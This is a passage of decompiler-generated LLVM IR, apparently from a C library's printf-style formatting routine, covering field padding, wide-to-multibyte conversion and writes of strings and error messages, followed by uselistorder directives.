  store i32 1, i32* @esi, align 4
  %v1_8050e15 = trunc i32 %v2_8050e07 to i8
  %v4_8050e15 = inttoptr i32 %v1_8050e09 to i8*
  store i8 %v1_8050e15, i8* %v4_8050e15, align 1
  %v0_8050e1c = load i32, i32* @esp, align 4
  %v1_8050e1c = add i32 %v0_8050e1c, 205
  %v2_8050e1c = inttoptr i32 %v1_8050e1c to i8*
  store i8 0, i8* %v2_8050e1c, align 1
  br label %dec_label_pc_8050e5e

dec_label_pc_8050e26:                             ; preds = %dec_label_pc_8050dd6
  %v9_8050e26 = icmp eq i32 %v3_8050b58, 20
  %v1_8050e29 = icmp eq i1 %v9_8050e26, false
  br i1 %v1_8050e29, label %dec_label_pc_8050fcb, label %dec_label_pc_8050e2f

dec_label_pc_8050e2f:                             ; preds = %dec_label_pc_8050e26
  %v0_8050e2f = load i32, i32* %stack_var_-364, align 4
  %v1_8050e2f = call i32 @__errno_location(i32 %v0_8050e2f)
  store i32 %v1_8050e2f, i32* %eax.global-to-local, align 4
  %v0_8050e34 = load i32, i32* @edx, align 4
  %v1_8050e34 = load i32, i32* @esp, align 4
  %v2_8050e34 = add i32 %v1_8050e34, -4
  %v3_8050e34 = inttoptr i32 %v2_8050e34 to i32*
  store i32 %v0_8050e34, i32* %v3_8050e34, align 4
  %v1_8050e35 = add i32 %v1_8050e34, -8
  %v2_8050e35 = inttoptr i32 %v1_8050e35 to i32*
  store i32 128, i32* %v2_8050e35, align 4
  %v1_8050e3a = add i32 %v1_8050e34, 204
  store i32 %v1_8050e3a, i32* %edx.global-to-local, align 4
  %v2_8050e41 = add i32 %v1_8050e34, -12
  %v3_8050e41 = inttoptr i32 %v2_8050e41 to i32*
  store i32 %v1_8050e3a, i32* %v3_8050e41, align 4
  %v1_8050e42 = inttoptr i32 %v1_8050e2f to i32*
  %v2_8050e42 = load i32, i32* %v1_8050e42, align 4
  %v4_8050e42 = add i32 %v1_8050e34, -16
  %v5_8050e42 = inttoptr i32 %v4_8050e42 to i32*
  store i32 %v2_8050e42, i32* %v5_8050e42, align 4
  %v0_8050e44 = load i32, i32* %stack_var_-364, align 4
  %v3_8050e44 = call i32 @__GI___glibc_strerror_r(i32 %v0_8050e44, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050e44, i32* %eax.global-to-local, align 4
  %v0_8050e49 = load i32, i32* @esp, align 4
  %v1_8050e49 = add i32 %v0_8050e49, 16
  store i32 %v3_8050e44, i32* @edi, align 4
  br label %dec_label_pc_8050dea

dec_label_pc_8050e50:                             ; preds = %dec_label_pc_8050cdf, %dec_label_pc_8050cd8, %dec_label_pc_8050cc5
  %v0_8050e6a36 = phi i32 [ %v1_8050c6b, %dec_label_pc_8050cdf ], [ 0, %dec_label_pc_8050cd8 ], [ 5, %dec_label_pc_8050cc5 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050e6a

dec_label_pc_8050e54:                             ; preds = %dec_label_pc_8050de4, %dec_label_pc_8050d57
  store i32 ptrtoint ([7 x i8]* @global_var_805b52a.216 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_8050e5e

dec_label_pc_8050e5e:                             ; preds = %dec_label_pc_8050e07, %dec_label_pc_8050df7, %dec_label_pc_8050dc7, %dec_label_pc_8050d9a, %dec_label_pc_8050e54
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_8050e65 = load i32, i32* @esp, align 4
  %v1_8050e65 = add i32 %v0_8050e65, 7
  %v2_8050e65 = inttoptr i32 %v1_8050e65 to i8*
  store i8 32, i8* %v2_8050e65, align 1
  %v0_8050e6a.pre = load i32, i32* @esi, align 4
  %v1_8050e6a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050e6a

dec_label_pc_8050e6a:                             ; preds = %dec_label_pc_8050e50, %dec_label_pc_8050ce7, %dec_label_pc_8050e5e
  %v1_8050e6a = phi i32 [ 0, %dec_label_pc_8050e50 ], [ %v2_8050cdf, %dec_label_pc_8050ce7 ], [ %v1_8050e6a.pre, %dec_label_pc_8050e5e ]
  %v0_8050e6a = phi i32 [ %v0_8050e6a36, %dec_label_pc_8050e50 ], [ %v1_8050c6b, %dec_label_pc_8050ce7 ], [ %v0_8050e6a.pre, %dec_label_pc_8050e5e ]
  %v2_8050e6a = add i32 %v0_8050e6a, %v1_8050e6a
  store i32 %v2_8050e6a, i32* @edx, align 4
  %v0_8050e6d = load i32, i32* @ebp, align 4
  %v9_8050e6d = icmp eq i32 %v0_8050e6d, 11
  br i1 %v9_8050e6d, label %dec_label_pc_8050e7e, label %dec_label_pc_8050e72

dec_label_pc_8050e72:                             ; preds = %dec_label_pc_8050e6a
  %v1_8050e74 = add i32 %v0_8050e6d, -5
  %v6_8050e74 = sub i32 4, %v0_8050e6d
  %v7_8050e74 = and i32 %v6_8050e74, %v0_8050e6d
  %v8_8050e74 = icmp slt i32 %v7_8050e74, 0
  %v9_8050e74 = icmp eq i32 %v1_8050e74, 0
  %v10_8050e74 = icmp slt i32 %v1_8050e74, 0
  %v3_8050e77 = icmp eq i1 %v10_8050e74, %v8_8050e74
  %v4_8050e77 = icmp eq i1 %v9_8050e74, false
  %v5_8050e77 = and i1 %v4_8050e77, %v3_8050e77
  %v6_8050e77 = zext i1 %v5_8050e77 to i32
  store i32 %v6_8050e77, i32* %eax.global-to-local, align 4
  %v2_8050e7a = add i32 %v2_8050e6a, 1
  %v3_8050e7a = add i32 %v2_8050e7a, %v6_8050e77
  store i32 %v3_8050e7a, i32* @edx, align 4
  br label %dec_label_pc_8050e7e

dec_label_pc_8050e7e:                             ; preds = %dec_label_pc_8050e6a, %dec_label_pc_8050e72
  %v0_8050e7e = load i32, i32* @esp, align 4
  %v1_8050e7e = add i32 %v0_8050e7e, 24
  %v2_8050e7e = inttoptr i32 %v1_8050e7e to i32*
  %v3_8050e7e = load i32, i32* %v2_8050e7e, align 4
  store i32 %v3_8050e7e, i32* %eax.global-to-local, align 4
  %v1_8050e82 = add i32 %v0_8050e7e, 8
  %v2_8050e82 = inttoptr i32 %v1_8050e82 to i32*
  store i32 0, i32* %v2_8050e82, align 4
  %v0_8050e8a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e8a = load i32, i32* @edx, align 4
  %v2_8050e8a = sub i32 %v0_8050e8a, %v1_8050e8a
  %v7_8050e8a = icmp ult i32 %v0_8050e8a, %v1_8050e8a
  %v12_8050e8a = icmp eq i32 %v2_8050e8a, 0
  %v2_8050e8c = or i1 %v7_8050e8a, %v12_8050e8a
  br i1 %v2_8050e8c, label %dec_label_pc_8050e94, label %dec_label_pc_8050e8e

dec_label_pc_8050e8e:                             ; preds = %dec_label_pc_8050e7e
  store i32 %v2_8050e8a, i32* %eax.global-to-local, align 4
  %v1_8050e90 = load i32, i32* @esp, align 4
  %v2_8050e90 = add i32 %v1_8050e90, 8
  %v3_8050e90 = inttoptr i32 %v2_8050e90 to i32*
  store i32 %v2_8050e8a, i32* %v3_8050e90, align 4
  %v0_8050e98.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050e94

dec_label_pc_8050e94:                             ; preds = %dec_label_pc_8050e7e, %dec_label_pc_8050e8e
  %v0_8050e98 = phi i32 [ %v1_8050e8a, %dec_label_pc_8050e7e ], [ %v0_8050e98.pre, %dec_label_pc_8050e8e ]
  %v0_8050e94 = load i32, i32* @esp, align 4
  %v1_8050e94 = add i32 %v0_8050e94, 8
  %v2_8050e94 = inttoptr i32 %v1_8050e94 to i32*
  %v3_8050e94 = load i32, i32* %v2_8050e94, align 4
  store i32 %v3_8050e94, i32* @ecx, align 4
  %v2_8050e98 = add i32 %v3_8050e94, %v0_8050e98
  store i32 %v2_8050e98, i32* %eax.global-to-local, align 4
  %v1_8050e9b = inttoptr i32 %v0_8050e94 to i32*
  %v2_8050e9b = load i32, i32* %v1_8050e9b, align 4
  %v4_8050e9b = add i32 %v2_8050e9b, %v2_8050e98
  store i32 %v4_8050e9b, i32* %v1_8050e9b, align 4
  %v0_8050e9e = load i32, i32* @esp, align 4
  %v1_8050e9e = add i32 %v0_8050e9e, 7
  %v2_8050e9e = inttoptr i32 %v1_8050e9e to i8*
  %v3_8050e9e = load i8, i8* %v2_8050e9e, align 1
  %v9_8050e9e = icmp eq i8 %v3_8050e9e, 48
  %v1_8050ea3 = icmp eq i1 %v9_8050e9e, false
  br i1 %v1_8050ea3, label %dec_label_pc_8050eaf, label %dec_label_pc_8050ea5

dec_label_pc_8050ea5:                             ; preds = %dec_label_pc_8050e94
  %v0_8050ea5 = load i32, i32* @ebx, align 4
  %v1_8050ea5 = load i32, i32* @ecx, align 4
  %v2_8050ea5 = add i32 %v1_8050ea5, %v0_8050ea5
  store i32 %v2_8050ea5, i32* @ebx, align 4
  %v1_8050ea7 = add i32 %v0_8050e9e, 8
  %v2_8050ea7 = inttoptr i32 %v1_8050ea7 to i32*
  store i32 0, i32* %v2_8050ea7, align 4
  %v0_8050eaf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050eaf

dec_label_pc_8050eaf:                             ; preds = %dec_label_pc_8050e94, %dec_label_pc_8050ea5
  %v0_8050eb6 = phi i32 [ %v0_8050e9e, %dec_label_pc_8050e94 ], [ %v0_8050eaf.pre, %dec_label_pc_8050ea5 ]
  %v1_8050eaf = add i32 %v0_8050eb6, 32
  %v2_8050eaf = inttoptr i32 %v1_8050eaf to i8*
  %v3_8050eaf = load i8, i8* %v2_8050eaf, align 1
  %v4_8050eaf = and i8 %v3_8050eaf, 8
  %v5_8050eaf = icmp eq i8 %v4_8050eaf, 0
  %v1_8050eb4 = icmp eq i1 %v5_8050eaf, false
  br i1 %v1_8050eb4, label %dec_label_pc_8050edd, label %dec_label_pc_8050eb6

dec_label_pc_8050eb6:                             ; preds = %dec_label_pc_8050eaf
  %v1_8050eb6 = add i32 %v0_8050eb6, 8
  %v2_8050eb6 = inttoptr i32 %v1_8050eb6 to i32*
  %v3_8050eb6 = load i32, i32* %v2_8050eb6, align 4
  store i32 %v3_8050eb6, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8050ebf = add i32 %v0_8050eb6, 368
  %v2_8050ebf = inttoptr i32 %v1_8050ebf to i32*
  %v3_8050ebf = load i32, i32* %v2_8050ebf, align 4
  store i32 %v3_8050ebf, i32* @eax, align 4
  %v0_8050ec6 = call i32 @_charpad()
  store i32 %v0_8050ec6, i32* %eax.global-to-local, align 4
  %v1_8050ecb = load i32, i32* @esp, align 4
  %v2_8050ecb = add i32 %v1_8050ecb, 8
  %v3_8050ecb = inttoptr i32 %v2_8050ecb to i32*
  %v4_8050ecb = load i32, i32* %v3_8050ecb, align 4
  %v15_8050ecb = icmp eq i32 %v0_8050ec6, %v4_8050ecb
  %v1_8050ecf = icmp eq i1 %v15_8050ecb, false
  br i1 %v1_8050ecf, label %dec_label_pc_8050fcb, label %dec_label_pc_8050ed5

dec_label_pc_8050ed5:                             ; preds = %dec_label_pc_8050eb6
  store i32 0, i32* %v3_8050ecb, align 4
  %v1_8050edd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050edd

dec_label_pc_8050edd:                             ; preds = %dec_label_pc_8050eaf, %dec_label_pc_8050ed5
  %v1_8050edd = phi i32 [ %v0_8050eb6, %dec_label_pc_8050eaf ], [ %v1_8050edd.pre, %dec_label_pc_8050ed5 ]
  %v0_8050edd = load i32, i32* %eax.global-to-local, align 4
  %v2_8050edd = add i32 %v1_8050edd, -4
  %v3_8050edd = inttoptr i32 %v2_8050edd to i32*
  store i32 %v0_8050edd, i32* %v3_8050edd, align 4
  %v0_8050ede = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ede = add i32 %v1_8050edd, -8
  %v3_8050ede = inttoptr i32 %v2_8050ede to i32*
  store i32 %v0_8050ede, i32* %v3_8050ede, align 4
  %v1_8050edf = add i32 %v1_8050edd, 368
  %v2_8050edf = inttoptr i32 %v1_8050edf to i32*
  %v3_8050edf = load i32, i32* %v2_8050edf, align 4
  %v5_8050edf = add i32 %v1_8050edd, -12
  %v6_8050edf = inttoptr i32 %v5_8050edf to i32*
  store i32 %v3_8050edf, i32* %v6_8050edf, align 4
  %v0_8050ee6 = load i32, i32* @ebp, align 4
  %v1_8050ee6 = add i32 %v0_8050ee6, ptrtoint (i32* @global_var_805b531.217 to i32)
  store i32 %v1_8050ee6, i32* %eax.global-to-local, align 4
  %v2_8050eec = add i32 %v1_8050edd, -16
  %v3_8050eec = inttoptr i32 %v2_8050eec to i32*
  store i32 %v1_8050ee6, i32* %v3_8050eec, align 4
  %v0_8050eed = load i32, i32* %stack_var_-364, align 4
  %v4_8050eed = inttoptr i32 %v0_8050eed to i8*
  %v5_8050eed = call i32 @__GI_fputs_unlocked(i8* %v4_8050eed, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050eed, i32* %eax.global-to-local, align 4
  %v0_8050ef2 = load i32, i32* @esp, align 4
  %v1_8050ef2 = add i32 %v0_8050ef2, 384
  %v2_8050ef2 = inttoptr i32 %v1_8050ef2 to i32*
  %v3_8050ef2 = load i32, i32* %v2_8050ef2, align 4
  store i32 %v3_8050ef2, i32* @eax, align 4
  %v0_8050ef9 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ef9, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8050f00 = call i32 @_charpad()
  store i32 %v0_8050f00, i32* %eax.global-to-local, align 4
  %v0_8050f05 = load i32, i32* @esp, align 4
  %v1_8050f05 = add i32 %v0_8050f05, 16
  %v1_8050f08 = load i32, i32* @ebx, align 4
  %v12_8050f08 = icmp eq i32 %v0_8050f00, %v1_8050f08
  %v1_8050f0a = icmp eq i1 %v12_8050f08, false
  br i1 %v1_8050f0a, label %dec_label_pc_8050fcb, label %dec_label_pc_8050f10

dec_label_pc_8050f10:                             ; preds = %dec_label_pc_8050edd
  %v1_8050f10 = add i32 %v0_8050f05, 356
  %v2_8050f10 = inttoptr i32 %v1_8050f10 to i32*
  %v3_8050f10 = load i32, i32* %v2_8050f10, align 4
  %v4_8050f10 = icmp eq i32 %v3_8050f10, 0
  %v1_8050f18 = icmp eq i1 %v4_8050f10, false
  br i1 %v1_8050f18, label %dec_label_pc_8050f3c, label %dec_label_pc_8050f1a

dec_label_pc_8050f1a:                             ; preds = %dec_label_pc_8050f10
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050f1c = load i32, i32* @esi, align 4
  %v1_8050f1c = icmp eq i32 %v0_8050f1c, 0
  br i1 %v1_8050f1c, label %dec_label_pc_8050f32, label %dec_label_pc_8050f20

dec_label_pc_8050f20:                             ; preds = %dec_label_pc_8050f1a
  %v2_8050f20 = add i32 %v0_8050f05, 12
  %v3_8050f20 = inttoptr i32 %v2_8050f20 to i32*
  store i32 0, i32* %v3_8050f20, align 4
  %v1_8050f21 = add i32 %v0_8050f05, 384
  %v2_8050f21 = inttoptr i32 %v1_8050f21 to i32*
  %v3_8050f21 = load i32, i32* %v2_8050f21, align 4
  %v5_8050f21 = add i32 %v0_8050f05, 8
  %v6_8050f21 = inttoptr i32 %v5_8050f21 to i32*
  store i32 %v3_8050f21, i32* %v6_8050f21, align 4
  %v0_8050f28 = load i32, i32* @esi, align 4
  %v2_8050f28 = add i32 %v0_8050f05, 4
  %v3_8050f28 = inttoptr i32 %v2_8050f28 to i32*
  store i32 %v0_8050f28, i32* %v3_8050f28, align 4
  %v0_8050f29 = load i32, i32* @edi, align 4
  %v3_8050f29 = inttoptr i32 %v0_8050f05 to i32*
  store i32 %v0_8050f29, i32* %v3_8050f29, align 4
  %v0_8050f2a = load i32, i32* %stack_var_-364, align 4
  %v4_8050f2a = call i32 @__stdio_fwrite(i32 %v0_8050f2a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050f2a, i32* %eax.global-to-local, align 4
  %v0_8050f2f = load i32, i32* @esp, align 4
  %v1_8050f2f = add i32 %v0_8050f2f, 16
  %v1_8050f32.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050f32

dec_label_pc_8050f32:                             ; preds = %dec_label_pc_8050f1a, %dec_label_pc_8050f20
  %v0_8050f9d46 = phi i32 [ %v1_8050f05, %dec_label_pc_8050f1a ], [ %v1_8050f2f, %dec_label_pc_8050f20 ]
  %v1_8050f32 = phi i32 [ 0, %dec_label_pc_8050f1a ], [ %v1_8050f32.pre, %dec_label_pc_8050f20 ]
  %v0_8050f32 = phi i32 [ 0, %dec_label_pc_8050f1a ], [ %v4_8050f2a, %dec_label_pc_8050f20 ]
  %v12_8050f32 = icmp eq i32 %v0_8050f32, %v1_8050f32
  %v1_8050f34 = icmp eq i1 %v12_8050f32, false
  br i1 %v1_8050f34, label %dec_label_pc_8050fcb, label %dec_label_pc_8050f9d

dec_label_pc_8050f3c:                             ; preds = %dec_label_pc_8050f10
  %v1_8050f3c = add i32 %v0_8050f05, 348
  %v2_8050f3c = inttoptr i32 %v1_8050f3c to i32*
  store i32 0, i32* %v2_8050f3c, align 4
  %v0_8050f997 = load i32, i32* @esi, align 4
  %v1_8050f998 = icmp eq i32 %v0_8050f997, 0
  %v1_8050f9b15 = icmp eq i1 %v1_8050f998, false
  br i1 %v1_8050f9b15, label %dec_label_pc_8050f49, label %dec_label_pc_8050f3c.dec_label_pc_8050f9d.loopexit_crit_edge

dec_label_pc_8050f3c.dec_label_pc_8050f9d.loopexit_crit_edge: ; preds = %dec_label_pc_8050f3c
  %v0_8050f9d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050f9d

dec_label_pc_8050f49:                             ; preds = %dec_label_pc_8050f3c, %dec_label_pc_8050f97
  %v0_8050f49 = phi i32 [ %v2_8050f97, %dec_label_pc_8050f97 ], [ %v0_8050f997, %dec_label_pc_8050f3c ]
  %tmp93 = icmp ult i32 %v0_8050f49, 129
  br i1 %tmp93, label %dec_label_pc_8050f58, label %dec_label_pc_8050f53

dec_label_pc_8050f53:                             ; preds = %dec_label_pc_8050f49
  br label %dec_label_pc_8050f58

dec_label_pc_8050f58:                             ; preds = %dec_label_pc_8050f49, %dec_label_pc_8050f53
  %storemerge94 = phi i32 [ 128, %dec_label_pc_8050f53 ], [ %v0_8050f49, %dec_label_pc_8050f49 ]
  store i32 %storemerge94, i32* %edx.global-to-local, align 4
  %v0_8050f58 = load i32, i32* @esp, align 4
  %v1_8050f58 = add i32 %v0_8050f58, 332
  %v2_8050f5f = add i32 %v0_8050f58, -4
  %v3_8050f5f = inttoptr i32 %v2_8050f5f to i32*
  store i32 %v1_8050f58, i32* %v3_8050f5f, align 4
  %v0_8050f60 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050f60 = add i32 %v0_8050f58, -8
  %v3_8050f60 = inttoptr i32 %v2_8050f60 to i32*
  store i32 %v0_8050f60, i32* %v3_8050f60, align 4
  %v1_8050f61 = add i32 %v0_8050f58, 340
  store i32 %v1_8050f61, i32* %eax.global-to-local, align 4
  %v2_8050f68 = add i32 %v0_8050f58, -12
  %v3_8050f68 = inttoptr i32 %v2_8050f68 to i32*
  store i32 %v1_8050f61, i32* %v3_8050f68, align 4
  %v1_8050f69 = add i32 %v0_8050f58, 204
  store i32 %v1_8050f69, i32* @edi, align 4
  %v2_8050f70 = add i32 %v0_8050f58, -16
  %v3_8050f70 = inttoptr i32 %v2_8050f70 to i32*
  store i32 %v1_8050f69, i32* %v3_8050f70, align 4
  %v0_8050f71 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8050f71, i32* @ebx, align 4
  %v0_8050f78 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050f7d = icmp eq i32 %v0_8050f71, 0
  br i1 %v1_8050f7d, label %dec_label_pc_8050f93, label %dec_label_pc_8050f81

dec_label_pc_8050f81:                             ; preds = %dec_label_pc_8050f58
  %v0_8050f81 = load i32, i32* @ebp, align 4
  %v2_8050f81 = add i32 %v0_8050f78, 12
  %v3_8050f81 = inttoptr i32 %v2_8050f81 to i32*
  store i32 %v0_8050f81, i32* %v3_8050f81, align 4
  %v1_8050f82 = add i32 %v0_8050f78, 384
  %v2_8050f82 = inttoptr i32 %v1_8050f82 to i32*
  %v3_8050f82 = load i32, i32* %v2_8050f82, align 4
  %v5_8050f82 = add i32 %v0_8050f78, 8
  %v6_8050f82 = inttoptr i32 %v5_8050f82 to i32*
  store i32 %v3_8050f82, i32* %v6_8050f82, align 4
  %v2_8050f89 = add i32 %v0_8050f78, 4
  %v3_8050f89 = inttoptr i32 %v2_8050f89 to i32*
  store i32 %v0_8050f71, i32* %v3_8050f89, align 4
  %v0_8050f8a = load i32, i32* @edi, align 4
  %v3_8050f8a = inttoptr i32 %v0_8050f78 to i32*
  store i32 %v0_8050f8a, i32* %v3_8050f8a, align 4
  %v0_8050f8b = load i32, i32* %stack_var_-364, align 4
  %v4_8050f8b = call i32 @__stdio_fwrite(i32 %v0_8050f8b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050f8b, i32* %eax.global-to-local, align 4
  %v0_8050f90 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050f93

dec_label_pc_8050f93:                             ; preds = %dec_label_pc_8050f58, %dec_label_pc_8050f81
  %v0_8050fcb49.in = phi i32 [ %v0_8050f78, %dec_label_pc_8050f58 ], [ %v0_8050f90, %dec_label_pc_8050f81 ]
  %v1_8050f97 = phi i32 [ 0, %dec_label_pc_8050f58 ], [ %v4_8050f8b, %dec_label_pc_8050f81 ]
  %v0_8050fcb49 = add i32 %v0_8050fcb49.in, 16
  %v12_8050f93 = icmp eq i32 %v1_8050f97, %v0_8050f71
  %v1_8050f95 = icmp eq i1 %v12_8050f93, false
  br i1 %v1_8050f95, label %dec_label_pc_8050fcb, label %dec_label_pc_8050f97

dec_label_pc_8050f97:                             ; preds = %dec_label_pc_8050f93
  %v0_8050f97 = load i32, i32* @esi, align 4
  %v2_8050f97 = sub i32 %v0_8050f97, %v1_8050f97
  %v12_8050f97 = icmp eq i32 %v2_8050f97, 0
  store i32 %v2_8050f97, i32* @esi, align 4
  %v1_8050f9b = icmp eq i1 %v12_8050f97, false
  br i1 %v1_8050f9b, label %dec_label_pc_8050f49, label %dec_label_pc_8050f9d

dec_label_pc_8050f9d:                             ; preds = %dec_label_pc_8050f97, %dec_label_pc_8050f3c.dec_label_pc_8050f9d.loopexit_crit_edge, %dec_label_pc_8050f32
  %v0_8050f9d = phi i32 [ %v0_8050f9d46, %dec_label_pc_8050f32 ], [ %v0_8050f9d.pre.pre, %dec_label_pc_8050f3c.dec_label_pc_8050f9d.loopexit_crit_edge ], [ %v0_8050fcb49, %dec_label_pc_8050f97 ]
  %v1_8050f9d = add i32 %v0_8050f9d, 8
  %v2_8050f9d = inttoptr i32 %v1_8050f9d to i32*
  %v3_8050f9d = load i32, i32* %v2_8050f9d, align 4
  store i32 %v3_8050f9d, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8050fa6 = add i32 %v0_8050f9d, 368
  %v2_8050fa6 = inttoptr i32 %v1_8050fa6 to i32*
  %v3_8050fa6 = load i32, i32* %v2_8050fa6, align 4
  store i32 %v3_8050fa6, i32* @eax, align 4
  %v0_8050fad = call i32 @_charpad()
  store i32 %v0_8050fad, i32* %eax.global-to-local, align 4
  %v1_8050fb2 = load i32, i32* @esp, align 4
  %v2_8050fb2 = add i32 %v1_8050fb2, 8
  %v3_8050fb2 = inttoptr i32 %v2_8050fb2 to i32*
  %v4_8050fb2 = load i32, i32* %v3_8050fb2, align 4
  %v15_8050fb2 = icmp eq i32 %v0_8050fad, %v4_8050fb2
  %v1_8050fb6 = icmp eq i1 %v15_8050fb2, false
  br i1 %v1_8050fb6, label %dec_label_pc_8050fcb, label %dec_label_pc_8050fb8

dec_label_pc_8050fb8:                             ; preds = %dec_label_pc_8050f9d, %dec_label_pc_8050d32, %dec_label_pc_8050b60
  %v0_8050fb8 = phi i32 [ %v1_8050fb2, %dec_label_pc_8050f9d ], [ %v0_8050fb8.pre, %dec_label_pc_8050d32 ], [ %v1_8050b7e, %dec_label_pc_8050b60 ]
  %v1_8050fb8 = add i32 %v0_8050fb8, 16
  %v2_8050fb8 = inttoptr i32 %v1_8050fb8 to i32*
  %v3_8050fb8 = load i32, i32* %v2_8050fb8, align 4
  store i32 %v3_8050fb8, i32* @ebx, align 4
  store i32 %v3_8050fb8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050ab8.backedge

dec_label_pc_8050fc3:                             ; preds = %dec_label_pc_8050af6
  %v1_8050fc3 = add i32 %v0_8050fc3, 2
  store i32 %v1_8050fc3, i32* @ebx, align 4
  br label %dec_label_pc_8050ab8.backedge

dec_label_pc_8050fcb:                             ; preds = %dec_label_pc_8050ae2, %dec_label_pc_8050f9d, %dec_label_pc_8050f32, %dec_label_pc_8050edd, %dec_label_pc_8050eb6, %dec_label_pc_8050e26, %dec_label_pc_8050da1, %dec_label_pc_8050d75, %dec_label_pc_8050d09, %dec_label_pc_8050f93
  %v0_8050fcb = phi i32 [ %v0_8050fcb49, %dec_label_pc_8050f93 ], [ %v0_8050fcb.pre.pre, %dec_label_pc_8050ae2 ], [ %v1_8050fb2, %dec_label_pc_8050f9d ], [ %v0_8050f9d46, %dec_label_pc_8050f32 ], [ %v1_8050f05, %dec_label_pc_8050edd ], [ %v1_8050ecb, %dec_label_pc_8050eb6 ], [ %v0_8050b58.lcssa, %dec_label_pc_8050e26 ], [ %v1_8050db9, %dec_label_pc_8050da1 ], [ %v1_8050d8c, %dec_label_pc_8050d75 ], [ %v1_8050d27, %dec_label_pc_8050d09 ]
  %v1_8050fcb = inttoptr i32 %v0_8050fcb to i32*
  store i32 -1, i32* %v1_8050fcb, align 4
  br label %dec_label_pc_8050fd2

dec_label_pc_8050fd2:                             ; preds = %dec_label_pc_8050aed, %dec_label_pc_8050a5b, %dec_label_pc_8050a7a, %dec_label_pc_8050fcb
  %v0_8050fd2 = load i32, i32* @esp, align 4
  %v1_8050fd2 = inttoptr i32 %v0_8050fd2 to i32*
  %v2_8050fd2 = load i32, i32* %v1_8050fd2, align 4
  store i32 %v2_8050fd2, i32* %eax.global-to-local, align 4
  %v1_8050fd5 = add i32 %v0_8050fd2, 348
  %v1_8050fdb = inttoptr i32 %v1_8050fd5 to i32*
  %v2_8050fdb = load i32, i32* %v1_8050fdb, align 4
  store i32 %v2_8050fdb, i32* @ebx, align 4
  %v3_8050fdc = add i32 %v0_8050fd2, 356
  %v1_8050fdd = inttoptr i32 %v3_8050fdc to i32*
  %v2_8050fdd = load i32, i32* %v1_8050fdd, align 4
  store i32 %v2_8050fdd, i32* @edi, align 4
  %v3_8050fdd = add i32 %v0_8050fd2, 360
  %v1_8050fde = inttoptr i32 %v3_8050fdd to i32*
  %v2_8050fde = load i32, i32* %v1_8050fde, align 4
  store i32 %v2_8050fde, i32* @ebp, align 4
  ret i32 %v2_8050fd2

; uselistorder directives
  uselistorder i32 %v1_8050fc3, { 1, 0 }
  uselistorder i32 %v3_8050fb8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8050f9d, { 1, 0 }
  uselistorder i32 %v2_8050f97, { 1, 2, 0 }
  uselistorder i32 %v0_8050fcb49, { 1, 0 }
  uselistorder i32 %v1_8050f97, { 1, 0 }
  uselistorder i32 %v0_8050f78, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_8050f05, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8050edd, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050eb6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8050e8a, { 1, 0, 2 }
  uselistorder i32 %v6_8050e77, { 1, 0 }
  uselistorder i32 %v1_8050e74, { 1, 0 }
  uselistorder i32 %v0_8050e6d, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8050df7, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_8050e07, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8050db4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050d68, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_8050d4e, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_8050ce7, { 1, 0, 2 }
  uselistorder i32 %v0_8050c9b, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_8050c6b, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_8050cbe, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_8050c47, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8050c00, { 1, 0 }
  uselistorder i32 %v1_8050c0d, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_8050b58, { 3, 11, 13, 5, 4, 7, 6, 8, 12, 0, 1, 2, 10, 9, 14, 15 }
  uselistorder i32 %v0_8050b58.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8050b54, { 1, 0 }
  uselistorder i32 %v1_8050b54.pre, { 1, 0 }
  uselistorder i32 %v1_8050b53, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_8050b50, { 1, 0 }
  uselistorder i32 %v2_8050b5472, { 1, 0 }
  uselistorder i32 %v3_8050b3a, { 1, 0 }
  uselistorder i32 %v1_8050af6, { 0, 2, 3, 1 }
